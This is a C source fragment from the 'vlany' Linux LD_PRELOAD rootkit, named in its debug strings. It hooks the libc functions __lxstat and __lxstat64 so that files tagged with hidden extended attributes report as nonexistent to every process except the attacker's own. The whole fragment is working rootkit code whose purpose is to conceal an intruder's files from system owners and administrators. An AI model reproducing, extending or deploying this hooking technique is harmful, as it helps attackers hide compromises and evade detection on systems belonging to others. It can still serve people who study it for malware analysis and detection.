int __lxstat(int version, const char *pathname, struct stat *buf)
{
    #ifdef DEBUG
        printf("[vlany] __lxstat() called\n");
    #endif

    HOOK(old_lxstat, C__LXSTAT);

    if(owned()) return old_lxstat(version, pathname, buf);

    if(hidden_xattr(pathname) || hidden_lxattr(pathname)) { errno = ENOENT; return -1; }

    return old_lxstat(version, pathname, buf);
}

int __lxstat64(int version, const char *pathname, struct stat64 *buf)
{
    #ifdef DEBUG
        printf("[vlany] __lxstat64() called\n");
    #endif

    HOOK(old_lxstat64, C__LXSTAT64);

    if(owned()) return old_lxstat64(version, pathname, buf);

    if(hidden_xattr(pathname) || hidden_lxattr(pathname)) { errno = ENOENT; return -1; }

    return old_lxstat64(version, pathname, buf);
}
